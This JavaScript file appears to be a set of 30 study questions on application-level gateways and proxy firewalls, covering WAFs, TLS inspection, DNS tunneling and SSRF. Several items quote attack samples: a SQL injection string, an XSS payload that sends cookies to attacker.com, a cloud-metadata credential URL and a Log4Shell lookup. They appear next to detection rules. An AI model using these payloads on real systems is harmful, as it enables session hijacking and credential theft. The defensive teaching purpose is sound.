const questions = [
  {
    id: 1,
    question: "What is an Application-Level Gateway (ALG / Proxy Firewall) and at which layer of the OSI model does it operate?",
    shortAnswer: "A firewall technology operating at Layer 7 (Application Layer) that terminates client application sessions, completely decodes and inspects application protocols, and reconstructs sanitized requests to destination servers.",
    explanation: "Unlike packet filtering or stateful firewalls that operate at Layers 3 and 4, an Application Proxy acts as a protocol-specific intermediary (e.g. for HTTP, SMTP, DNS). It parses the full application syntax, validates compliance with RFC standards, strips malicious payloads, and regenerates a fresh request across a separate socket.",
    hint: "Operates at OSI Layer 7 (Application Layer) and understands high-level application protocols.",
    level: "Basic",
    codeExample: `// Application Proxy Scope:
// Client -> [Layer 7 Application Proxy (Terminates HTTP/TLS & Inspects SQLi/XSS)] -> Origin Server`
  },
  {
    id: 2,
    question: "How does the 'Dual-Session Architecture' of an Application Proxy decouple the client from the origin server?",
    shortAnswer: "The client establishes TCP/TLS session 1 with the proxy; the proxy inspects and sanitizes the application request, and then establishes an independent TCP/TLS session 2 with the origin server.",
    explanation: "There is zero direct network routing or packet forwarding between the client and server. If an attacker sends malformed TCP flags, buffer overflow payloads, or unapproved HTTP headers, the proxy absorbs the input locally and forwards only clean, compliant application tokens to the backend server.",
    hint: "Two completely separate application sessions: Client-to-Proxy and Proxy-to-Server.",
    level: "Moderate",
    codeExample: `// Dual-Session Architecture:
// [Client: 10.10.1.50] <=== HTTP/TLS Session 1 ===> [Application Proxy] <=== HTTP/TLS Session 2 ===> [Origin DB Server]`
  },
  {
    id: 3,
    question: "What is the operational difference between a 'Forward Application Proxy' and a 'Reverse Application Proxy'?",
    shortAnswer: "A Forward Proxy protects internal clients making outbound requests to the Internet (URL filtering, caching, malware scanning); a Reverse Proxy protects internal web/application servers from incoming Internet traffic (WAF, SSL offloading, load balancing).",
    explanation: "Forward proxies (like Squid or Zscaler) sit at the corporate perimeter, intercepting employee web requests to enforce acceptable-use policies and scan for downloaded malware. Reverse proxies (like NGINX or Envoy) sit in front of server farms, terminating external TLS connections and defending servers against SQL injection and DDoS attacks.",
    hint: "Forward protects outgoing internal users; Reverse protects incoming backend web servers.",
    level: "Basic",
    codeExample: `// Forward vs Reverse Proxy:
// Forward Proxy: Internal Employee -> [Forward Proxy (Squid)] -> Public Internet
// Reverse Proxy: Public Internet   -> [Reverse Proxy (NGINX)] -> Internal Web Server`
  },
  {
    id: 4,
    question: "Why does an Application-Level Gateway require a dedicated daemon for each application protocol it inspects?",
    shortAnswer: "Because it must fully understand the grammatical syntax, commands, header structures, and error codes of each specific protocol (e.g., HTTP vs SMTP vs DNS vs SQL).",
    explanation: "A packet filter or SPI firewall processes raw bytes and port numbers generically. An Application Proxy must have specialized software parsers: an HTTP proxy understands `GET`, `POST`, and cookies; an SMTP proxy understands `HELO`, `MAIL FROM`, and MIME attachments. It cannot inspect protocols for which it lacks a dedicated parser.",
    hint: "Each protocol has its own language and syntax requiring a dedicated software parser.",
    level: "Moderate",
    codeExample: `// Protocol-Specific Proxy Modules:
const proxyDaemons = {
  http: "NGINX / Envoy (Parses URIs, Headers, JSON, Cookies)",
  smtp: "Postfix / Milter (Parses MIME, DKIM, SpamAssassin)",
  dns:  "Unbound / CoreDNS (Parses DNSSEC, Query Types)",
  sql:  "ProxySQL (Parses SQL Query ASTs)"
};`
  },
  {
    id: 5,
    question: "How does an Application-Level Gateway detect and block SQL Injection (SQLi) attacks that bypass Stateful (SPI) firewalls?",
    shortAnswer: "The proxy parses the HTTP request URI and body, decodes URL-encoding and Unicode obfuscation, and runs regex or AST analysis to detect SQL syntax (e.g. `UNION SELECT` or `' OR '1'='1`).",
    explanation: "An SPI firewall only verifies that packets have valid TCP sequence numbers on port 443. The Application Proxy decrypts TLS, extracts parameter strings, and inspects the payload: identifying SQL metacharacters and blocking the request with HTTP 403 Forbidden before it reaches the backend database.",
    hint: "It decodes the application payload and reads the SQL command string inside the HTTP request.",
    level: "Basic",
    codeExample: `// L7 SQLi Inspection Logic:
// Request: GET /search?id=1%27%20UNION%20SELECT%20password%20FROM%20users--
// Proxy: Decodes URL -> Matches 'UNION SELECT' -> Returns HTTP 403 Forbidden!`
  },
  {
    id: 6,
    question: "What is 'HTTP Verb / Method Filtering' and why do application proxies block verbs like `TRACE` and `CONNECT` on public web servers?",
    shortAnswer: "`TRACE` can be exploited for Cross-Site Tracing (XST) to steal HTTP-only session cookies; `CONNECT` can be abused by attackers to tunnel arbitrary TCP traffic through an open web proxy.",
    explanation: "Security baselines on public reverse proxies enforce strict method whitelisting: permitting only `GET`, `POST`, and `HEAD`. Blocking `TRACE`, `TRACK`, `DELETE`, and `PUT` prevents cookie theft and unauthorized file modifications on the web server.",
    hint: "Restricting permitted HTTP commands to prevent cookie theft and unauthorized uploads.",
    level: "Moderate",
    codeExample: `// NGINX HTTP Verb Whitelist:
// if ($request_method !~ ^(GET|HEAD|POST)$) {
//     return 405 "Method Not Allowed";
// }`
  },
  {
    id: 7,
    question: "What is 'SSL/TLS Decryption & Inspection' (TLS Offloading / MITM Proxying) and how does an Application Proxy perform it?",
    shortAnswer: "The proxy terminates the client's TLS tunnel using the server's private key (or enterprise CA certificate for outbound traffic), decrypts the plaintext payload for inspection, and re-encrypts it to the origin server.",
    explanation: "Over 95% of web traffic is encrypted with HTTPS. Without TLS decryption, application proxies are blind to payloads. In Reverse Proxy mode, the proxy hosts the official SSL certificate, offloading CPU cryptographic load from backend web servers while inspecting decrypted HTTP traffic in memory.",
    hint: "Decrypting the HTTPS stream in proxy memory to inspect the plaintext contents before re-encrypting.",
    level: "Moderate",
    codeExample: `// TLS Offloading Architecture:
// Client === [Encrypted HTTPS (Port 443)] ===> [Reverse Proxy (Decrypted L7 Inspection)] === [Re-encrypted mTLS] ===> Database`
  },
  {
    id: 8,
    question: "What are the primary performance bottlenecks and overheads of Application-Level Gateways compared to Stateful (SPI) Firewalls?",
    shortAnswer: "High CPU utilization from TLS cryptographic operations and regex parsing, high RAM usage for buffering multi-megabyte payloads, and increased request latency (5–30 ms vs microseconds).",
    explanation: "While an SPI firewall forwards packets in microseconds using kernel memory, an Application Proxy must buffer full HTTP bodies in user-space RAM, decompress gzip streams, parse JSON/XML trees, and evaluate hundreds of regex rules, reducing total throughput from 40 Gbps to 1–5 Gbps per appliance.",
    hint: "Heavy CPU usage for TLS/regex parsing, high RAM consumption, and millisecond latency delays.",
    level: "Basic",
    codeExample: `// Latency & Processing Overhead Comparison:
// Stateless Packet Filter : ~1 nanosecond (Hardware TCAM)
// Stateful Firewall (SPI) : ~100 nanoseconds (Kernel Conntrack Table)
// Application Proxy (ALG) : ~5 - 25 milliseconds (TLS Decryption + JSON/Regex Parsing)`
  },
  {
    id: 9,
    question: "How does an Application Proxy perform 'Server Banner Masking / Header Normalization' to defeat adversary reconnaissance?",
    shortAnswer: "The proxy intercepts server response headers and strips or rewrites identifying headers (such as `Server: Apache/2.4.41` or `X-Powered-By: PHP/7.4.3`) to prevent attackers from fingerprinting vulnerable backend software versions.",
    explanation: "When an attacker scans a web server, response headers disclose the exact operating system and software patch level. An Application Proxy strips these headers or rewrites them to generic tokens (e.g. `Server: SecureGateway/1.0`), denying attackers the reconnaissance needed to select version-specific exploits.",
    hint: "Hiding server software and version numbers from outgoing response headers.",
    level: "Basic",
    codeExample: `// NGINX Header Stripping Directive:
// server_tokens off;
// more_clear_headers 'Server' 'X-Powered-By' 'X-AspNet-Version';`
  },
  {
    id: 10,
    question: "What is 'MIME-Type / Content-Type Filtering' in enterprise application proxies?",
    shortAnswer: "The proxy inspects the `Content-Type` header and verifies actual file magic bytes, blocking executable file downloads (`.exe`, `.sh`, `.bat`) or unapproved file formats from entering the corporate network.",
    explanation: "Attackers often disguise malicious Windows executables as `.jpg` or `.pdf` files. An application proxy inspects the actual binary magic bytes (e.g. detecting `MZ` header `0x4D5A`), blocking the download even if the filename and HTTP header claim it is an innocent image.",
    hint: "Checking the true file format using binary headers rather than trusting the filename extension.",
    level: "Moderate",
    codeExample: `// Magic Byte MIME Validation:
// If File starts with 0x4D 0x5A ('MZ' - Windows Executable) AND Policy blocks Executables -> Drop Flow!`
  },
  {
    id: 11,
    question: "How does an Application-Level Gateway protect against 'HTTP Request Smuggling' attacks (RFC 7230 discrepancies)?",
    shortAnswer: "The proxy normalizes ambiguous `Content-Length` and `Transfer-Encoding` headers, enforcing strict RFC compliance and rebuilding a single canonical HTTP request for the backend server.",
    explanation: "Request smuggling occurs when frontend proxies and backend servers interpret chunked encoding boundaries differently, allowing an attacker to smuggle hidden requests. An application proxy resolves discrepancies by rejecting requests with conflicting headers (`400 Bad Request`) or rewriting them to clean, unambiguous representations.",
    hint: "Resolves conflicting Content-Length and Transfer-Encoding headers to prevent smuggled requests.",
    level: "Expert",
    codeExample: `// Request Smuggling Prevention:
// IF Request contains BOTH 'Content-Length' AND 'Transfer-Encoding: chunked':
//     Strip 'Content-Length' OR Reject with HTTP 400 Bad Request!`
  },
  {
    id: 12,
    question: "What is an 'SMTP Mail Gateway Proxy' (e.g. Postfix + ClamAV + SpamAssassin) and what specific application controls does it enforce?",
    shortAnswer: "An Application Proxy for email that inspects SMTP transactions (`HELO`, `MAIL FROM`, `RCPT TO`), validates SPF/DKIM/DMARC records, strips dangerous attachment macros, and scans message bodies for phishing and spam.",
    explanation: "Unlike a network firewall that simply allows port 25, an SMTP Proxy decodes the entire email RFC 5322 structure. It quarantines emails containing malicious Office macros, verifies sender reputation via DNSBL lookups, and ensures encrypted TLS delivery between mail transfer agents.",
    hint: "An email proxy that checks sender legitimacy, scans attachments for malware, and blocks spam.",
    level: "Moderate",
    codeExample: `// SMTP Gateway Security Pipeline:
// Ingress -> [TLS Handshake] -> [SPF / DKIM / DMARC Check] -> [Antivirus Attachment Scan] -> [Spam Scoring] -> Deliver to Inbox`
  },
  {
    id: 13,
    question: "What is a 'DNS Application Proxy' (e.g. Unbound / Pi-hole / CoreDNS) and how does it prevent DNS Tunneling?",
    shortAnswer: "A proxy that inspects DNS query structures, validates DNSSEC signatures, and analyzes query entropy and payload lengths to detect and block data exfiltration disguised as base64 DNS queries.",
    explanation: "Malware exfiltrates stolen data by encoding bytes into DNS subdomains (e.g. `a3f91b.stolen-data.attacker.com`). A DNS Application Proxy inspects query lengths, detects high entropy (randomness), and blocks non-compliant or excessive TXT/NULL record queries.",
    hint: "Detects malware exfiltrating stolen data encoded inside DNS queries.",
    level: "Expert",
    codeExample: `// DNS Tunneling Detection Rule:
// IF Query.Subdomain.Length > 50 AND ShannonEntropy(Query.Subdomain) > 4.5 -> Flag as DNS Tunneling Exfiltration!`
  },
  {
    id: 14,
    question: "What is a 'Database Application Proxy' (e.g. ProxySQL, pgpool-II) and what security controls does it provide?",
    shortAnswer: "A Layer 7 proxy for database protocols (MySQL, PostgreSQL) that inspects SQL statements, enforces query whitelisting, prevents destructive queries (`DROP TABLE`), and masks sensitive PII columns.",
    explanation: "Sitting between web application servers and database instances, a database proxy inspects SQL Abstract Syntax Trees (AST). It blocks unauthorized queries, prevents developer workstations from running bulk `SELECT * FROM users` queries, and caches read results to improve performance.",
    hint: "An intermediary proxy that inspects and filters raw SQL database queries.",
    level: "Moderate",
    codeExample: `// ProxySQL Query Rule:
// INSERT INTO mysql_query_rules (rule_id, active, match_pattern, error_msg)
// VALUES (1, 1, '^DROP TABLE', 'DROP TABLE commands are forbidden by policy!');`
  },
  {
    id: 15,
    question: "What is 'URL Whitelisting / Blacklisting' in enterprise Forward Proxies and how does Category-Based Filtering operate?",
    shortAnswer: "The proxy matches requested URLs against categorized threat intelligence feeds, allowing access to approved business categories (Banking, Government) while blocking malicious or unapproved sites (Phishing, Gambling, Darknet).",
    explanation: "Enterprise forward proxies (such as Squid or Zscaler) evaluate the `Host` and path headers against cloud database feeds containing millions of classified domains, automatically blocking employees from accessing known command-and-control (C2) domains or newly registered malicious sites.",
    hint: "Categorizing websites and blocking dangerous or non-business categories.",
    level: "Basic",
    codeExample: `// Squid Proxy ACL Rule:
// acl ForbiddenCategories dstdomain "/etc/squid/gambling_malware_domains.txt"
// http_access deny ForbiddenCategories`
  },
  {
    id: 16,
    question: "What is 'Web Application Firewall (WAF)' in the context of Application-Level Gateways?",
    shortAnswer: "A specialized Layer 7 Reverse Proxy designed specifically to protect web applications by inspecting HTTP/HTTPS traffic against the OWASP Top 10 vulnerabilities (SQLi, XSS, CSRF, SSRF, RCE, Broken Object Level Authorization).",
    explanation: "A standard network firewall protects ports and IP addresses; a WAF is an Application-Level Gateway dedicated to web traffic. It implements signature engines (e.g. OWASP Core Rule Set), rate limiting, and bot detection algorithms to defend APIs and web applications from sophisticated application-layer exploits.",
    hint: "A specialized reverse application proxy dedicated to stopping OWASP Top 10 web exploits.",
    level: "Basic",
    codeExample: `// ModSecurity Core Rule Set (CRS) Rule:
// SecRule REQUEST_URI "@rx (?i:union\s+select)" "id:1001,phase:2,deny,status:403,msg:'SQLi Attack Detected'"`
  },
  {
    id: 17,
    question: "What is 'Buffering vs Streaming Mode' in Application-Level Proxies and how does it affect memory consumption?",
    shortAnswer: "Buffering mode stores the entire HTTP request/response in RAM before inspecting it (allowing full payload inspection but consuming high memory); Streaming mode inspects chunks in real-time (saving memory but risking incomplete inspection of split payloads).",
    explanation: "In Buffering mode, a 50 MB file upload consumes 50 MB of proxy RAM while the antivirus scans it. If 1,000 users upload files simultaneously, the proxy requires 50 GB of RAM. Streaming proxies inspect byte windows on the fly, balancing memory consumption against detection depth.",
    hint: "Holding the whole file in memory to inspect vs inspecting continuous streams as they pass.",
    level: "Expert",
    codeExample: `// NGINX Client Body Buffer Sizing:
// client_body_buffer_size 128k;
// client_max_body_size 20M;`
  },
  {
    id: 18,
    question: "How does an Application-Level Gateway enforce 'User Identity & Authentication' before proxying outbound corporate web traffic?",
    shortAnswer: "By issuing an HTTP 407 (Proxy Authentication Required) challenge, validating user credentials via NTLM, Kerberos, or SAML/OIDC before opening outbound sessions.",
    explanation: "When an employee opens a browser, the forward proxy intercepts the request and demands authentication (`407 Proxy Authentication Required`). The browser provides domain credentials, allowing the proxy to log exact employee usernames for every web request, ensuring accountability.",
    hint: "Demands HTTP 407 authentication so every web request is tied to an authenticated employee username.",
    level: "Moderate",
    codeExample: `// HTTP 407 Challenge Flow:
// 1. Client -> Proxy: GET http://google.com
// 2. Proxy -> Client: HTTP/1.1 407 Proxy Authentication Required (Proxy-Authenticate: Negotiate)
// 3. Client -> Proxy: GET http://google.com (Proxy-Authorization: Kerberos Ticket)`
  },
  {
    id: 19,
    question: "What is 'Response Body Data Loss Prevention (DLP)' in enterprise reverse application proxies?",
    shortAnswer: "The proxy inspects outgoing HTTP response bodies from backend servers, using regex to detect and mask sensitive data (such as 12-digit Aadhaar numbers, 16-digit credit card PANs, or database error dumps).",
    explanation: "If a database error causes an internal application to leak cleartext credit card numbers or citizen Aadhaar details, the DLP filter inside the reverse proxy catches the regex pattern on egress, replacing digits with asterisks (`XXXX-XXXX-1234`) to prevent catastrophic data leaks under the DPDP Act 2023.",
    hint: "Scanning outgoing responses to mask credit cards and Aadhaar numbers before they leave the server.",
    level: "Moderate",
    codeExample: `// DLP Aadhaar Masking Regex:
// Pattern: \b\d{4}\s\d{4}\s\d{4}\b -> Replaced with: "XXXX XXXX " + Last4Digits`
  },
  {
    id: 20,
    question: "Why can an Application-Level Gateway NOT easily support peer-to-peer (P2P) or custom non-standard protocols?",
    shortAnswer: "Because it lacks a protocol parser for custom binaries, and P2P protocols dynamically open direct connections between arbitrary client nodes, violating the centralized client-proxy-server mediation model.",
    explanation: "Application proxies require strict, well-defined client-server protocols (HTTP, SMTP). P2P protocols (BitTorrent, blockchain nodes) communicate directly between decentralized peers over random ports with encrypted proprietary framing, which application proxies cannot parse or mediate.",
    hint: "Lacks custom parsers and cannot handle direct peer-to-peer decentralized connections.",
    level: "Basic",
    codeExample: `// Protocol Compatibility:
// HTTP / HTTPS / SMTP / DNS : Supported via dedicated ALGs
// BitTorrent / Custom SCADA  : Blocked or unsupported due to missing L7 parsers`
  },
  {
    id: 21,
    question: "What is 'WebSockets / gRPC Proxying' and what challenges does it present to traditional HTTP Application Gateways?",
    shortAnswer: "WebSockets and gRPC (HTTP/2 / HTTP/3) maintain long-lived, persistent bidirectional binary streams; proxies must support HTTP upgrade handshakes and frame-level multiplexing rather than traditional request-response cycles.",
    explanation: "Traditional HTTP proxies process discrete Request-Response pairs and close the socket. WebSockets upgrade a connection to a permanent full-duplex TCP tunnel (`101 Switching Protocols`), and gRPC multiplexes binary Protocol Buffer streams over a single connection, requiring modern proxies (Envoy, NGINX) to inspect multiplexed binary frames.",
    hint: "Persistent full-duplex binary connections that require frame-level inspection rather than standard request-response cycles.",
    level: "Expert",
    codeExample: `// NGINX WebSocket Upgrade Proxying:
// proxy_set_header Upgrade $http_upgrade;
// proxy_set_header Connection "upgrade";
// proxy_http_version 1.1;`
  },
  {
    id: 22,
    question: "How does an Application Proxy handle 'Gzip / Brotli Compressed Payloads' during security inspection?",
    shortAnswer: "The proxy must decompress the gzip/brotli byte stream in memory, execute security regex pattern matching on the uncompressed text, and optionally recompress the payload before forwarding.",
    explanation: "Attackers compress HTTP bodies to hide SQLi or XSS strings from naive inspection engines. An Application Proxy de-chunks and decompresses the `Content-Encoding: gzip` payload in RAM to reveal the plaintext HTML/JSON content for full vulnerability inspection.",
    hint: "Decompresses the zip/brotli stream in RAM to inspect the hidden plaintext underneath.",
    level: "Moderate",
    codeExample: `// Decompression Inspection Pipeline:
// Compressed HTTP Body -> [zlib decompress in RAM] -> Plaintext JSON -> [SQLi/XSS Regex Engine] -> [Recompress] -> Forward`
  },
  {
    id: 23,
    question: "What is 'Cross-Site Scripting (XSS) Sanitization' at the Application Proxy tier?",
    shortAnswer: "Detecting and stripping unescaped HTML tags (`<script>`, `<iframe>`), JavaScript event handlers (`onload=`, `onerror=`), and URI schemes (`javascript:`) from HTTP input parameters.",
    explanation: "When a user submits a comment on a portal, the application proxy scans form fields. If it detects `<script>document.location='http://attacker.com?c='+document.cookie</script>`, the proxy strips the malicious tags or rejects the request (`403 Forbidden`), protecting other users from session hijacking.",
    hint: "Stripping executable JavaScript and HTML tags from user inputs.",
    level: "Basic",
    codeExample: `// XSS Detection Pattern:
// SecRule ARGS "@rx <script\b[^>]*>(.*?)<\/script>" "id:2001,phase:2,deny,status:403,msg:'XSS Injection Blocked'"`
  },
  {
    id: 24,
    question: "What is 'SSRF (Server-Side Request Forgery) Prevention' inside an API Application Gateway?",
    shortAnswer: "Validating that outgoing requests initiated by the server cannot target internal loopback addresses (`127.0.0.1`), private RFC 1918 subnets (`10.0.0.0/8`), or cloud metadata endpoints (`169.254.169.254`).",
    explanation: "In an SSRF attack, an adversary tricks a web application into fetching data from internal cloud metadata (`http://169.254.169.254/latest/meta-data/iam/credentials`). An API gateway inspects outbound URL parameters, blocking any request resolving to private IP ranges.",
    hint: "Preventing attackers from tricking the server into connecting to internal management or metadata IPs.",
    level: "Expert",
    codeExample: `// SSRF Blacklist in Application Gateway:
// Block URLs containing: 127.0.0.1, localhost, 169.254.169.254, 10.0.0.0/8, 192.168.0.0/16`
  },
  {
    id: 25,
    question: "How does an Application Proxy manage 'Client IP Preservation' using the `X-Forwarded-For` (XFF) header?",
    shortAnswer: "Because the proxy replaces the client's source IP with its own IP, it appends the client's original IP address into the `X-Forwarded-For: <client_ip>` HTTP header so backend servers can log the real user.",
    explanation: "When backend web servers receive requests from a reverse proxy, the TCP packet source IP is always the proxy's IP. The proxy appends the original user's IP into `X-Forwarded-For`, allowing backend applications and CERT-In compliance loggers to record the true origin IP.",
    hint: "Appends the real user's IP into the X-Forwarded-For header so backend servers know who sent the request.",
    level: "Basic",
    codeExample: `// X-Forwarded-For Header Injection:
// Proxy adds: X-Forwarded-For: 198.51.100.25
// Backend Server reads: req.headers['x-forwarded-for']`
  },
  {
    id: 26,
    question: "What is 'HTTP Parameter Pollution (HPP)' and how does an Application Proxy defend against it?",
    shortAnswer: "Supplying multiple parameters with the same name (e.g. `?id=1&id=2`) to confuse backend frameworks; the proxy normalizes parameter parsing by rejecting duplicate parameter keys.",
    explanation: "Different backend technologies handle duplicate query parameters differently (PHP takes the last, ASP takes both combined with a comma). Attackers exploit these discrepancies to bypass WAF signatures. An application proxy enforces strict parameter uniqueness, rejecting ambiguous inputs.",
    hint: "Preventing duplicate parameter names from confusing backend application parsers.",
    level: "Expert",
    codeExample: `// HPP Example:
// Request: GET /transfer?amount=100&amount=10000
// Proxy Action: Flags duplicate parameter 'amount' -> Rejects with HTTP 400 Bad Request!`
  },
  {
    id: 27,
    question: "What logging telemetry must an Application Proxy record to comply with CERT-In and DPDP Act mandates?",
    shortAnswer: "Timestamp (NPL NTP), Client Source IP, `X-Forwarded-For` chain, Authenticated User ID, HTTP Method, Requested URI/Path, HTTP Status Code, Request/Response Byte Counts, TLS Cipher Suite, and WAF Rule IDs triggered.",
    explanation: "Application proxy logs are the primary forensic evidence during web application breach investigations. Under CERT-In directives, full HTTP transaction logs and security block alerts must be archived securely for 180 days within Indian borders.",
    hint: "Timestamp, client IP, user ID, method, URI, status code, byte counts, TLS cipher, and WAF alerts.",
    level: "Basic",
    codeExample: `// JSON Structured Proxy Access Log:
const accessLog = {
  timestamp: "2026-08-23T10:20:15.112Z",
  clientIp: "10.10.1.50",
  method: "POST",
  uri: "/api/v1/tax-filing",
  statusCode: 200,
  bytesSent: 4820,
  tlsVersion: "TLSv1.3",
  wafAction: "ALLOWED"
};`
  },
  {
    id: 28,
    question: "What is 'Zero-Day Virtual Patching' via an Application-Level Gateway?",
    shortAnswer: "Deploying a targeted Layer 7 inspection rule on the reverse proxy to block an exploit signature for a newly disclosed vulnerability within minutes, without modifying or redeploying backend application code.",
    explanation: "When a zero-day vulnerability like Log4Shell (`${jndi:ldap://...}`) is disclosed, patching thousands of backend enterprise servers takes weeks. Security teams write a single WAF rule on the reverse proxy in 5 minutes, instantly blocking all exploit attempts across the entire enterprise.",
    hint: "Blocking an exploit at the proxy within minutes without waiting for software developers to patch code.",
    level: "Moderate",
    codeExample: `// Log4Shell Virtual Patch Rule:
// SecRule REQUEST_HEADERS|REQUEST_BODY "@rx \${jndi:(ldap|rmi|dns):" "id:9999,phase:2,deny,status:403,msg:'Log4Shell Blocked'"`
  },
  {
    id: 29,
    question: "Why are Application-Level Gateways considered the most secure firewall generation for Layer 7 web services?",
    shortAnswer: "Because they completely terminate network connections, eliminate direct IP reachability to origin servers, and inspect the semantic meaning and syntax of application payloads.",
    explanation: "While packet filters and SPI firewalls protect network ports, only Application-Level Gateways inspect what users are actually saying to servers. By validating syntax, sanitizing payloads, enforcing authentication, and masking server responses, ALGs provide comprehensive defense against modern application-layer threats.",
    hint: "Total protocol termination + Deep semantic payload inspection + Complete topology isolation.",
    level: "Basic",
    codeExample: `// The Application Proxy Security Advantage:
// 1. Decouples Network Protocols (Zero raw socket reachability)
// 2. Understands Application Grammars (Catches SQLi, XSS, SSRF)
// 3. Masks Backend Server Identities (Prevents recon)`
  },
  {
    id: 30,
    question: "Synthesize the overarching role of Application-Level Gateways in modern multi-tier enterprise perimeter security.",
    shortAnswer: "Application-Level Gateways provide deep Layer 7 semantic inspection and payload sanitization, acting as the intelligent application defense layer deployed behind high-speed stateless ACLs and stateful SPI firewalls in a Defense-in-Depth hierarchy.",
    explanation: "Stateless filters handle line-rate edge dropping; SPI firewalls track TCP session states; and Application Proxies (WAFs/ALGs) inspect and sanitize application payloads. Layering these technologies ensures high throughput, resilient state management, and impenetrable application security.",
    hint: "The intelligent Layer 7 application guardian operating atop stateless and stateful network filters.",
    level: "Moderate",
    codeExample: `// Complete 3-Tier Firewall Hierarchy:
// Tier 1: Stateless Edge ACL (Line-Rate DDoS / Bogon Drop)
// Tier 2: Stateful SPI Firewall (L4 Connection Tracking & TCP State)
// Tier 3: Application-Level Gateway (L7 TLS Termination & WAF Payload Sanitization)`
  }
];

export default questions;
